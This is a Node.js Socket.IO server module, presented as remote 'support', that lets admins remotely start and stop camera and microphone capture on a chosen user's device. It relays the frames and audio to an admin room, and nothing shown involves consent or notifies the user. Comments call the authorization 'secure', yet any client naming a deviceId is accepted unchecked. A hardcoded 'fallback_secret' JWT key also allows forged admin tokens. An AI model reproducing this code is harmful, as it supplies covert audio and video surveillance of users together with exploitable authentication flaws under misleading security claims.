const jwt = require('jsonwebtoken');

module.exports = (io) => {
  const supportNamespace = io.of('/support');

  // Secure authorization handshake logic to map connections
  supportNamespace.use((socket, next) => {
    const token = socket.handshake.auth.token || socket.handshake.query.token;
    const deviceId = socket.handshake.auth.deviceId || socket.handshake.query.deviceId;

    if (deviceId) {
      // Device authenticated via local installation unique profile footprint id context mapping directly
      socket.deviceId = deviceId;
      socket.role = 'device';
      return next();
    }

    if (token) {
      // Admin checking via administrative Bearer JWT token session validated
      try {
        const decoded = jwt.verify(token, process.env.JWT_SECRET || 'fallback_secret');
        if (decoded.admin) {
          socket.role = 'admin';
          return next();
        }
      } catch (err) {
        return next(new Error('Administrative support session unauthorized'));
      }
    }

    return next(new Error('Authentication parameters (deviceId or Token) not specified'));
  });

  supportNamespace.on('connection', (socket) => {
    console.log(`[Support Node connected] ID: ${socket.id} | Role: ${socket.role} | Context Identity: ${socket.deviceId || 'Admin Session'}`);

    if (socket.role === 'device') {
      // Securely join devices room mapped to device ID
      socket.join(`device-${socket.deviceId}`);
      console.log(`Device associated successfully with room: device-${socket.deviceId}`);
    } else if (socket.role === 'admin') {
      // Admins join centralized telemetry room listening on signals
      socket.join('admins-pool');
    }

    // Interactive Realtime Stream Controls
    socket.on('support-start-camera', ({ userId }) => {
      if (socket.role !== 'admin') {
        return socket.emit('error', 'Only admins can trigger camera actions');
      }
      console.log(`[Admin triggered Camera start stream command] Target user device room id: ${userId}`);
      supportNamespace.to(`device-${userId}`).emit('start-camera');
    });

    socket.on('support-stop-camera', ({ userId }) => {
      if (socket.role !== 'admin') {
        return socket.emit('error', 'Only admins can trigger camera actions');
      }
      console.log(`[Admin triggered Camera stop stream command] Target user: ${userId}`);
      supportNamespace.to(`device-${userId}`).emit('stop-camera');
    });

    socket.on('support-start-audio', ({ userId }) => {
      if (socket.role !== 'admin') {
        return socket.emit('error', 'Only admins can trigger audio stream actions');
      }
      console.log(`[Admin triggered Audio start stream command] Target user: ${userId}`);
      supportNamespace.to(`device-${userId}`).emit('start-audio');
    });

    socket.on('support-stop-audio', ({ userId }) => {
      if (socket.role !== 'admin') {
        return socket.emit('error', 'Only admins can trigger audio actions');
      }
      console.log(`[Admin triggered Audio stop stream command] Target user: ${userId}`);
      supportNamespace.to(`device-${userId}`).emit('stop-audio');
    });

    // Device telemetry feeds relayed across administration dashboards
    socket.on('camera-frame', ({ userId, frameBase64 }) => {
      if (socket.role === 'device') {
        // Relay camera captures to active admins dashboard in realtime
        supportNamespace.to('admins-pool').emit('camera-frame-relay', { userId, frameBase64 });
      }
    });

    socket.on('audio-stream', ({ userId, audioBase64 }) => {
      if (socket.role === 'device') {
        // Relay mic capture frames
        supportNamespace.to('admins-pool').emit('audio-stream-relay', { userId, audioBase64 });
      }
    });

    socket.on('disconnect', () => {
      console.log(`[Support Node disconnected] ID: ${socket.id}`);
    });
  });
};
